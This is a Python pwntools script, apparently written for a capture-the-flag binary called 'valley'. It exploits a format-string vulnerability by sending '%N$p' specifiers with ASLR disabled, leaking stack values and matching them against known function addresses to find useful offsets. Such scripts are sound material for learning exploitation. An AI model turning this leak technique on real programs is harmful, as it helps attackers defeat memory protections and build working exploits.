#! /usr/bin/python3
'''
This script should be ran after gathering memory address locations for the various functions in the binary (assuming you have the source code/have function names).
You can provide it both the start memory location and function memory locations.  You should adjust the various aspects to suit your own binary.
This script will only work if the binary is vulnerable to print format vulnerabilities.
'''

from pwn import *
import itertools

# Loops until the user enters a valid integer that corresponds with the number of memory addresses the script should parse through.
while(True):
  try:
    count = int(input("Please enter the number of memory addresses we should try: "))
    break
  except Exception as e:
    print("ERROR: Please enter a valid integer, your response ({count}) was not valid.")

# Loops until a break occurs
while(True):
  # Errors out if the user enters invalid hex (address location) data.
  try:
    print("\nEnter the expected start address of the program: ")
    start_addr = input("Address: ")
    # Attempts to conver the string to an integer and then to hex, if it fails the user did something wrong.
    hex(int(start_addr, 16))
    break
  except Exception as e:
    print(f"\nERROR: Invalid hex data entered ({start_addr}), please try again.")

print("\nIf you have expected addresses of other functions, enter them below.")
print("Please use this format: func_name:address.")
print("When done, or if you do not wish to enter additional addresses, simply press enter.")

# Initializes a dictionary to hold the user's entered info.
addrs = {}
# Initializes a string so the while loop will run.
res = " "
while(res):
  # Errors out if the user enters invalid hex data.
  try:
    res = input("Function Address (func_name:address): ")
    # Attempts to add the user's entered data into the dictionary with the func_name as the key and the address as the value.
    hex(int(res.split(":")[1], 16))
    addrs[res.split(":")[1]] = res.split(":")[0]
  except Exception as e:
    if res:
      print(f"\nERROR: Invalid hex data entered({res}), please try again.")

# Disables ASLR to mimic gdb
context.aslr = False
# Sets up the ELF so we can go through it.
elf = context.binary = ELF('./valley')
# Runs the process in the background
p = process()
# Gets the first line since we don't really care about it.
p.recvline()

# Initiates some lists for holding any matches we find.
matches = []
exact_matches = []

# Loops through the values 1-count, trying out those stack locations.
for i in range(1,count):
  # Sends the line that we'll be using to get the leak, .encode is necessary to quiet an annoying pwntools warning.
  p.sendline(f'%{i}$p'.encode())

  # Grabs the leak from the web server.
  elf_leak = p.recvline().decode().split(": ")[1].strip()

  # Checks if the leak is an exact match and adds it to exact_matches.
  if elf_leak in addrs.keys():
    exact_matches.append([elf_leak, i])
  # Checks if the leak is a close match and adds it to the close matches.
  elif start_addr[:-4] in elf_leak:
    matches.append([elf_leak, i])

# Only goes in here if there are any matches in exact_matches
if exact_matches:
  print("\nEXACT MATCHES")
  print("-------------")
  for i in exact_matches:
    print(f"Exact Match for Function {addrs[i[0]]} at offset {i[1]}: {i[0]}")

# Only goes in here if there are any matches in matches
if matches:
  print("\nCLOSE MATCHES")
  print("-------------")
  for i in matches:
    print(f"Close Match at offset {i[1]}: {i[0]}")

# If there are no matches at all
if not exact_matches and not matches:
  print("No matches found :(")
